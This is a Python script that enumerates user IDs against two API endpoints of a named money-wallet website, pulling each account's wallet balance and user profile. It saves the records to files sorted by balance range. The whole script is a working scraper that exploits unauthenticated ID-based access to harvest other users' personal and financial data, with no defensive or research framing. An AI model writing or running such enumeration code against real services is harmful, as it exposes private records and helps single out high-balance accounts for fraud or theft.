import requests
import string
import json 
from pygments import highlight, lexers, formatters
import datetime
def get_info(i,e):


   

    def get_date():
        return datetime.date.today().strftime("%Y%m%d")
    
    def colourize(x):
        return highlight(x, lexers.JsonLexer(), formatters.TerminalFormatter())


        
    id = 111456

    while id > 0: 
        id -= 1
        r = requests.Session()
        info = r.get(i+str(id)).json()
        
        #if info['walletAmount'] != 0:
        
        info = info['walletAmount']
        info = json.dumps(info, sort_keys=True, indent=4)
        user_wallet = colourize(info)
        
        info2 = r.get(e+str(id)).json()
        info2 = json.dumps(info2, sort_keys=True, indent=4)
        user_info2 = colourize(info2)

        print()
        print("User Wallet: ",user_wallet)
        print()
        print(user_info2)
        print('==============================================================')

        def write_files(filename):
            with open(f'{get_date()}'+'cash'+filename,'a') as f:
                f.write("Wallet Balance: %s" %info) 
                f.write(user_info2)
                
                f.write("=============================================")
                f.close()

        user_wallet = int(info)
        if user_wallet > 0 and user_wallet < 10000:
            write_files('0-10,000.txt')
        elif user_wallet > 10000 and user_wallet <  100000:
            write_files('10,000-100,000.txt')
        elif user_wallet > 100000 and user_wallet < 1000000:
            write_files('100,000-1,000,000.txt')
        elif user_wallet > 1000000 and user_wallet < 10000000 :
            write_files('1,000,000-10,000,000.txt')
        
        #else:
        #    print("Userid => %s has no money." %id)
if __name__ == '__main__':
    get_info('http://www.komoney.website/komoney-res-v1/api/home/getdatabyuser/','http://www.komoney.website/komoney-res-v1/api/user/getuserbyid/')
    

